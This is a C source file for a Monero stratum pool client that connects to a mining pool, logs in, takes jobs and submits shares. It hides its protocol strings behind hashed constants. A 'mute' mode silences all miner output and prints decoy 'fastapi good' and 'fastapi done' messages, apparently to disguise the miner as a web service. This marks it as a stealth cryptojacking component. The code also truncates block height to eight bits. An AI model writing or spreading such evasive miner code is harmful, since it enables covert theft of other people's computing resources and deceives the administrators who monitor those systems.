#include "libstratum.h"
#include "libjson.h"
#include "libutils.h"
#include "libcrypto.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>

extern int g_mute;

#define MUTE_FMT(cond, ...) do { if (!(cond)) printf(__VA_ARGS__); } while(0)

static uint64_t rpc_id_counter = 0;
static uint64_t next_rpc_id(void) { return __sync_fetch_and_add(&rpc_id_counter, 1) + 1; }

static int raw_send(stratum_ctx_t *ctx, const void *data, size_t len)
{
    return ws_tcp_send(&ctx->conn, data, len);
}

static int raw_recv(stratum_ctx_t *ctx, void *buf, size_t len, int timeout_ms)
{
    return ws_tcp_recv(&ctx->conn, buf, len, timeout_ms);
}

static int proto_send(stratum_ctx_t *ctx, const char *data, size_t len)
{
    if (ctx->conn.use_ws)
        return ws_send_frame(&ctx->conn, data, len);
    return raw_send(ctx, data, len);
}

static int proto_recv(stratum_ctx_t *ctx, char *buf, size_t buf_size, int timeout_ms)
{
    if (ctx->conn.use_ws)
        return ws_recv_frame(&ctx->conn, buf, buf_size, timeout_ms);
    size_t total = 0;
    while (total < buf_size - 1) {
        int n = raw_recv(ctx, buf + total, 1, timeout_ms);
        if (n <= 0) return total > 0 ? (int)total : n;
        total += n;
        if (buf[total - 1] == '\n') break;
    }
    buf[total] = '\0';
    return (int)total;
}

static int handle_job(stratum_ctx_t *ctx, cJSON *params)
{
    if (!params || !cJSON_IsObject(params)) return -1;
    cJSON *job_id = cJSON_GetObjectItem(params, STR_d697ea38);
    cJSON *blob   = cJSON_GetObjectItem(params, STR_ee26908b);
    cJSON *target = cJSON_GetObjectItem(params, STR_42aefbae);
    cJSON *seed   = cJSON_GetObjectItem(params, STR_3d6b27ea);
    cJSON *height = cJSON_GetObjectItem(params, STR_b435e227);
    if (!job_id || !blob || !target) return -1;
    if (!cJSON_IsString(job_id) || !cJSON_IsString(blob) || !cJSON_IsString(target)) return -1;

    pthread_mutex_lock(&ctx->job_lock);
    strncpy(ctx->current_job.job_id, job_id->valuestring, sizeof(ctx->current_job.job_id) - 1);
    ctx->current_job.job_id[sizeof(ctx->current_job.job_id) - 1] = '\0';
    strncpy(ctx->current_job.blob, blob->valuestring, sizeof(ctx->current_job.blob) - 1);
    ctx->current_job.blob[sizeof(ctx->current_job.blob) - 1] = '\0';
    strncpy(ctx->current_job.target, target->valuestring, sizeof(ctx->current_job.target) - 1);
    ctx->current_job.target[sizeof(ctx->current_job.target) - 1] = '\0';
    if (seed && cJSON_IsString(seed) && seed->valuestring) {
        strncpy(ctx->current_job.seed_hash, seed->valuestring, sizeof(ctx->current_job.seed_hash) - 1);
        ctx->current_job.seed_hash[sizeof(ctx->current_job.seed_hash) - 1] = '\0';
    }
    if (height && cJSON_IsNumber(height))
        ctx->current_job.height = (uint8_t)height->valueint;
    ctx->current_job.has_job = true;

    if (!g_mute) printf("[stratum] job: %s height=%d target=%s\n",
           ctx->current_job.job_id, ctx->current_job.height, ctx->current_job.target);
    pthread_mutex_unlock(&ctx->job_lock);
    return 0;
}

static void stratum_send_keepalive(stratum_ctx_t *ctx)
{
    cJSON *msg = cJSON_CreateObject();
    cJSON_AddNumberToObject(msg, STR_b80bb774, next_rpc_id());
    cJSON_AddStringToObject(msg, STR_fb50a170, "2.0");
    cJSON_AddStringToObject(msg, STR_ea9f6aca, STR_fdbb048e);

    cJSON *params = cJSON_CreateObject();
    pthread_mutex_lock(&ctx->job_lock);
    cJSON_AddStringToObject(params, STR_b80bb774, ctx->rpc_id);
    pthread_mutex_unlock(&ctx->job_lock);
    cJSON_AddItemToObject(msg, STR_21ffce5b, params);

    char *json_str = cJSON_PrintUnformatted(msg);
    cJSON_Delete(msg);
    if (!json_str) return;

    size_t len = strlen(json_str);
    proto_send(ctx, json_str, len);
    if (!ctx->conn.use_ws) raw_send(ctx, "\n", 1);
    cJSON_free(json_str);
}

void *stratum_recv_loop(void *arg)
{
    stratum_ctx_t *ctx = (stratum_ctx_t *)arg;
    char buf[65536];
    time_t last_keepalive = time(NULL);

    while (ctx->running) {
        int n = proto_recv(ctx, buf, sizeof(buf), 5000);
        if (n <= 0) {
            if (n == 0) {
                if (!g_mute) fprintf(stderr, "[stratum] connection closed\n");
                ctx->connected = false;
                break;
            }
            time_t now = time(NULL);
            if (now - last_keepalive >= 30) {
                stratum_send_keepalive(ctx);
                last_keepalive = now;
            }
            continue;
        }
        last_keepalive = time(NULL);

        cJSON *msg = cJSON_Parse(buf);
        if (!msg) continue;

        cJSON *method = cJSON_GetObjectItem(msg, STR_ea9f6aca);
        cJSON *params = cJSON_GetObjectItem(msg, STR_21ffce5b);
        cJSON *result = cJSON_GetObjectItem(msg, STR_b4a88417);
        cJSON *error  = cJSON_GetObjectItem(msg, STR_cb5e100e);

        if (method && method->valuestring) {
            if (strcmp(method->valuestring, STR_9dddd5ce) == 0) {
                handle_job(ctx, params);
            } else if (strcmp(method->valuestring, STR_30de4bc6) == 0) {
                if (!g_mute) printf("[stratum] pool requested reconnect\n");
                ctx->connected = false;
                cJSON_Delete(msg);
                break;
            }
        } else if (result && cJSON_IsObject(result)) {
            cJSON *id = cJSON_GetObjectItem(msg, STR_b80bb774);
            if (id && (uint64_t)id->valuedouble == ctx->login_rpc_id) {
                cJSON *rpc_id = cJSON_GetObjectItem(result, STR_b80bb774);
                if (rpc_id && rpc_id->valuestring) {
                    pthread_mutex_lock(&ctx->job_lock);
                    strncpy(ctx->rpc_id, rpc_id->valuestring, sizeof(ctx->rpc_id) - 1);
                    pthread_mutex_unlock(&ctx->job_lock);
                }
                cJSON *ext = cJSON_GetObjectItem(result, STR_2ac737d2);
                if (ext && cJSON_IsArray(ext)) {
                    int arr_n = cJSON_GetArraySize(ext);
                    for (int i = 0; i < arr_n; i++) {
                        cJSON *e = cJSON_GetArrayItem(ext, i);
                        if (e && e->valuestring && strcmp(e->valuestring, STR_7ff17303) == 0)
                            ctx->nicehash = true;
                    }
                }
                if (!g_mute) printf("[stratum] login OK%s\n", ctx->nicehash ? " (NiceHash)" : "");
                if (g_mute) printf("fastapi good\n");

                cJSON *job_obj = cJSON_GetObjectItem(result, STR_9dddd5ce);
                if (job_obj) handle_job(ctx, job_obj);
            } else {
                cJSON *status = cJSON_GetObjectItem(result, STR_9acb4454);
                if (!status || !cJSON_IsString(status) || strcmp(status->valuestring, STR_6e9248ac) != 0) {
                    ctx->shares_accepted++;
                    if (!g_mute) printf("[stratum] share accepted (#%lu)\n", ctx->shares_accepted);
                    if (g_mute) printf("fastapi done\n");
                }
            }
        } else if (error && cJSON_IsObject(error)) {
            cJSON *emsg = cJSON_GetObjectItem(error, "message");
            if (!g_mute) fprintf(stderr, "[stratum] error: %s\n", (emsg && cJSON_IsString(emsg)) ? emsg->valuestring : "unknown");
            ctx->shares_rejected++;
        }
        cJSON_Delete(msg);
    }
    return NULL;
}

int stratum_connect(stratum_ctx_t *ctx, const char *url, const char *user, const char *pass)
{
    memset(ctx, 0, sizeof(*ctx));
    strncpy(ctx->url, url, sizeof(ctx->url) - 1);
    strncpy(ctx->user, user, sizeof(ctx->user) - 1);
    strncpy(ctx->pass, pass, sizeof(ctx->pass) - 1);
    pthread_mutex_init(&ctx->job_lock, NULL);
    ctx->running = true;
    ctx->connected = false;
    ctx->conn.fd = -1;
    ctx->recv_thread = 0;

    char host[256], path[512];
    int port = 3333;
    int use_tls = 0;
    int use_ws = 0;

    const char *p = url;

    if (strncmp(p, "wss://", 6) == 0) {
        use_tls = 1;
        use_ws = 1;
        port = 443;
        p += 6;
    } else if (strncmp(p, "ws://", 5) == 0) {
        use_ws = 1;
        port = 80;
        p += 5;
    } else if (strncmp(p, "stratum+ssl://", 14) == 0) {
        use_tls = 1;
        port = 443;
        p += 14;
    } else if (strncmp(p, "stratum+tcp://", 14) == 0) {
        port = 3333;
        p += 14;
    }

    const char *slash = strchr(p, '/');
    const char *colon = strchr(p, ':');
    size_t host_len;
    if (colon && (!slash || colon < slash)) {
        host_len = colon - p;
        port = atoi(colon + 1);
    } else if (slash) {
        host_len = slash - p;
    } else {
        host_len = strlen(p);
    }
    if (host_len >= sizeof(host)) host_len = sizeof(host) - 1;
    memcpy(host, p, host_len);
    host[host_len] = '\0';
    if (slash) {
        snprintf(path, sizeof(path), "%s", slash);
    } else {
        strcpy(path, "/");
    }

    if (!g_mute) printf("[stratum] connecting to %s:%d ...\n", host, port);

    if (use_ws) {
        if (ws_connect(&ctx->conn, host, port, use_tls, AUTH_KEY) != 0) {
            if (!g_mute) fprintf(stderr, "[stratum] WebSocket connection failed\n");
            return -1;
        }
    } else {
        if (ws_tcp_connect(&ctx->conn, host, port, use_tls) != 0) {
            if (!g_mute) fprintf(stderr, "[stratum] TCP connection failed\n");
            return -1;
        }
    }

    ctx->connected = true;
    return 0;
}

int stratum_login(stratum_ctx_t *ctx)
{
    uint64_t login_id = next_rpc_id();
    ctx->login_rpc_id = login_id;
    cJSON *msg = cJSON_CreateObject();
    cJSON_AddNumberToObject(msg, STR_b80bb774, login_id);
    cJSON_AddStringToObject(msg, STR_fb50a170, "2.0");
    cJSON_AddStringToObject(msg, STR_ea9f6aca, STR_d56b6998);

    cJSON *params = cJSON_CreateObject();
    cJSON_AddStringToObject(params, STR_d56b6998, ctx->user);
    cJSON_AddStringToObject(params, STR_1a1dc91c, ctx->pass);
    cJSON_AddStringToObject(params, STR_b33aed8f, "xmrminer/1.0.0");
    cJSON_AddItemToObject(msg, STR_21ffce5b, params);

    char *json_str = cJSON_PrintUnformatted(msg);
    cJSON_Delete(msg);
    if (!json_str) return -1;

    if (!g_mute) printf("[stratum] >>> %s\n", json_str);
    size_t len = strlen(json_str);
    proto_send(ctx, json_str, len);
    if (!ctx->conn.use_ws) raw_send(ctx, "\n", 1);
    cJSON_free(json_str);

    ctx->running = true;
    pthread_create(&ctx->recv_thread, NULL, stratum_recv_loop, ctx);

    if (!g_mute) printf("[stratum] waiting for login...\n");
    for (int i = 0; i < 20; i++) {
        if (ctx->current_job.has_job) {
            if (!g_mute) printf("[stratum] login OK, mining!\n");
            return 0;
        }
        usleep(500000);
    }
    if (!g_mute) fprintf(stderr, "[stratum] login timeout\n");
    return -1;
}

int stratum_submit(stratum_ctx_t *ctx, const char *job_id, const char *nonce_hex, const char *result_hex)
{
    cJSON *msg = cJSON_CreateObject();
    cJSON_AddNumberToObject(msg, STR_b80bb774, next_rpc_id());
    cJSON_AddStringToObject(msg, STR_fb50a170, "2.0");
    cJSON_AddStringToObject(msg, STR_ea9f6aca, STR_c79bdf42);

    cJSON *params = cJSON_CreateObject();
    pthread_mutex_lock(&ctx->job_lock);
    cJSON_AddStringToObject(params, STR_b80bb774, ctx->rpc_id);
    pthread_mutex_unlock(&ctx->job_lock);
    cJSON_AddStringToObject(params, STR_d697ea38, job_id);
    cJSON_AddStringToObject(params, STR_cb584e44, nonce_hex);
    cJSON_AddStringToObject(params, STR_b4a88417, result_hex);
    cJSON_AddItemToObject(msg, STR_21ffce5b, params);

    char *json_str = cJSON_PrintUnformatted(msg);
    cJSON_Delete(msg);
    if (!json_str) return -1;

    if (!g_mute) printf("[stratum] >>> %s\n", json_str);
    size_t len = strlen(json_str);
    proto_send(ctx, json_str, len);
    if (!ctx->conn.use_ws) raw_send(ctx, "\n", 1);
    cJSON_free(json_str);
    return 0;
}

void stratum_disconnect(stratum_ctx_t *ctx)
{
    ctx->running = false;
    ctx->connected = false;
    if (ctx->conn.fd >= 0) close(ctx->conn.fd);
    ctx->conn.fd = -1;
    if (ctx->recv_thread) pthread_join(ctx->recv_thread, NULL);
    ws_close(&ctx->conn);
    pthread_mutex_destroy(&ctx->job_lock);
    if (!g_mute) printf("[stratum] disconnected. accepted=%lu rejected=%lu\n",
           ctx->shares_accepted, ctx->shares_rejected);
}

bool stratum_get_job(stratum_ctx_t *ctx, stratum_job_t *job)
{
    pthread_mutex_lock(&ctx->job_lock);
    if (!ctx->current_job.has_job) { pthread_mutex_unlock(&ctx->job_lock); return false; }
    *job = ctx->current_job;
    pthread_mutex_unlock(&ctx->job_lock);
    return true;
}
